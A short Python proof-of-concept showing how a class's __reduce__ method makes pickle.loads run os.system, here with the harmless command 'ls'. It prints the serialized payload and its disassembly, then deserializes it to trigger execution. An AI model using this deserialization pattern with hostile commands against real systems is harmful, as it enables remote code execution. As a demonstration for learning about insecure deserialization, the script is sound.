#!/usr/bin/env python

import os
import base64

class MyClass:
    def __init__(self):
        print('Im being constructed!')

    def behavior1(self):
        print('Im doing some behavior1!')
    def behavior2(self):
        print('Im doing some behavior2!')
    def behavior3(self):
        print('Im doing some behavior3!')

    def __reduce__(self):
        print('RCE!')
        return os.system, ('ls',)

def test():
    print(f'starting')

    obj = MyClass()

    import pickle

    # serialize it
    print('serializing')
    serialized = pickle.dumps(obj)
    print('repr: ' + repr(serialized))
    print(' hex: ' + serialized.hex())
    print(' b64: ' + base64.b64encode(serialized).decode('ascii'))

    #
    print('resulting instructions:')
    import pickletools
    pickletools.dis(serialized)

    # deserialize it
    print('deserializing')
    deserialized = pickle.loads(serialized)
    print(deserialized)
    #print(type(deserialized))
    deserialized.behavior1()
    deserialized.behavior2()
    deserialized.behavior3()

if __name__ == '__main__':
    test()
